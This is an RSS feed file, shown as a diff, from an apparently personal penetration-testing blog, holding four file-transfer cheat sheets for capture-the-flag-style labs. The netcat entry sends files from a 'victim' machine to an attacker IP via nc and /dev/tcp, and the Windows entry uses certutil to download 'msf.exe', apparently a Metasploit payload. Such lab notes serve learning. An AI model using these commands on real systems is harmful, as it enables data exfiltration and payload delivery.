@@ -1,0 +1,101 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>File-Transfer on Gajendra Mahato</title>
+    <link>http://localhost:1313/tags/file-transfer/</link>
+    <description>Recent content in File-Transfer on Gajendra Mahato</description>
+    <generator>Hugo -- 0.155.3</generator>
+    <language>en</language>
+    <lastBuildDate>Tue, 13 Jan 2026 00:00:00 +0000</lastBuildDate>
+    <atom:link href="http://localhost:1313/tags/file-transfer/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>📁 File Transfer Using Netcat</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/netcat/</guid>
+      <description>&lt;h2 id=&#34;-step-1-start-listening-on-local-machine-kali&#34;&gt;🖥️ Step 1: Start Listening on Local Machine (Kali)&lt;/h2&gt;
+&lt;p&gt;Run the following command to start listening for incoming files:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -lp &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;gt; filename    &lt;span class=&#34;c1&#34;&gt;# waiting for receiving the files&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-step-2-transfer-file-from-remote-machine-victim&#34;&gt;📤 Step 2: Transfer File from Remote Machine (Victim)&lt;/h2&gt;
+&lt;p&gt;Run this command on the victim machine to send the file:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nc -w &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 10.10.14.19 &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; &amp;lt; filename    &lt;span class=&#34;c1&#34;&gt;# it&amp;#39;s time to send the file&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;, use this alternative method:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat filename &amp;gt; /dev/tcp/10.10.14.19/4444
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; &lt;code&gt;10.10.14.19&lt;/code&gt; is the IP address of the &lt;strong&gt;local machine (tun0)&lt;/strong&gt;.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>📡 File Transfer via FTP on Linux</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/ftp-on-linux/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-using-ftp-command&#34;&gt;🧰 Using &lt;code&gt;ftp&lt;/code&gt; Command&lt;/h2&gt;
+&lt;h3 id=&#34;1-connect-to-ftp-server&#34;&gt;1. Connect to FTP Server&lt;/h3&gt;
+&lt;p&gt;Replace &lt;code&gt;10.10.10.98&lt;/code&gt; with your target FTP server IP or domain:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp 10.10.10.98
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;2-login-as-anonymous&#34;&gt;2. Login as Anonymous&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Name (10.10.10.98:yourusername): anonymous
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Password: (press Enter)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;3-set-binary-mode&#34;&gt;3. Set Binary Mode&lt;/h3&gt;
+&lt;p&gt;To handle all types of files properly:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; binary
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;4-disable-prompting-for-multiple-files&#34;&gt;4. Disable Prompting (for Multiple Files)&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; prompt off
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Interactive mode off.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h3 id=&#34;5-download-files-wildcard&#34;&gt;5. Download Files (Wildcard)&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ftp&amp;gt; mget *
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;⚠️ Note: Standard &lt;code&gt;ftp&lt;/code&gt; does &lt;strong&gt;not support recursive&lt;/strong&gt; download.
+For recursive download, use a better client like &lt;code&gt;lftp&lt;/code&gt;.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>🔐 File Transfer Over SSH Using `scp`</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/ssh-using-scp/</guid>
+      <description>&lt;hr&gt;
+&lt;h2 id=&#34;-uploadingsending-a-directory-from-local-to-ssh-server&#34;&gt;📤 Uploading/Sending a Directory from Local to SSH Server&lt;/h2&gt;
+&lt;p&gt;Use either of the following commands:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -r ./shell/* u0_a418@192.168.0.20:/home/gnu/shell/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -r -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; ./shell u0_a418@192.168.0.20:/home/gnu/shell/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-downloadingreceiving-a-directory-from-ssh-server-to-local&#34;&gt;📥 Downloading/Receiving a Directory from SSH Server to Local&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; -r u0_a418@192.168.0.20:/home/gnu/* ./gnu/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;OR&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -r -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; u0_a418@192.168.0.20:/home/gnu ./gnu/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-uploadingsending-a-file-from-local-to-ssh-server&#34;&gt;📤 Uploading/Sending a File from Local to SSH Server&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; ./shell.php u0_a418@192.168.0.20:/home/gnu/shell.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id=&#34;-downloadingreceiving-a-file-from-ssh-server-to-local&#34;&gt;📥 Downloading/Receiving a File from SSH Server to Local&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;scp -P &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; u0_a418@192.168.0.20:/home/gnu/flag.txt ./flag.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
+&lt;p&gt;📝 &lt;strong&gt;Note:&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Tutorial: Downloading Files from Linux to Windows Using Windows CLI</title>
+      <link>http://localhost:1313/posts/tipsandtricks/cheatsheets/windows-native-shell/</link>
+      <pubDate>Tue, 13 Jan 2026 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/tipsandtricks/cheatsheets/windows-native-shell/</guid>
+      <description>&lt;h2 id=&#34;method-1-using-an-http-server&#34;&gt;Method 1: Using an HTTP Server&lt;/h2&gt;
+&lt;h3 id=&#34;step-1-start-an-http-server-on-linux&#34;&gt;Step 1: Start an HTTP server on Linux&lt;/h3&gt;
+&lt;p&gt;Open a terminal on your Linux machine and run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo python3 -m http.server &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;step-2-download-the-file-using-certutil-on-windows&#34;&gt;Step 2: Download the file using &lt;code&gt;certutil&lt;/code&gt; on Windows&lt;/h3&gt;
+&lt;p&gt;Open Command Prompt or PowerShell on your Windows machine and run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;certutil&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-urlcache&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-split&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-f&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://10.10.14.7/msf.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;method-2-using-invoke-webrequest&#34;&gt;Method 2: Using &lt;code&gt;Invoke-WebRequest&lt;/code&gt;&lt;/h2&gt;
+&lt;h3 id=&#34;step-1-start-an-http-server-on-linux-1&#34;&gt;Step 1: Start an HTTP server on Linux&lt;/h3&gt;
+&lt;p&gt;Same as Step 1 in Method 1.&lt;/p&gt;
+&lt;h3 id=&#34;step-2-download-the-file-using-invoke-webrequest-on-windows&#34;&gt;Step 2: Download the file using &lt;code&gt;Invoke-WebRequest&lt;/code&gt; on Windows&lt;/h3&gt;
+&lt;p&gt;Open PowerShell on your Windows machine and run:&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
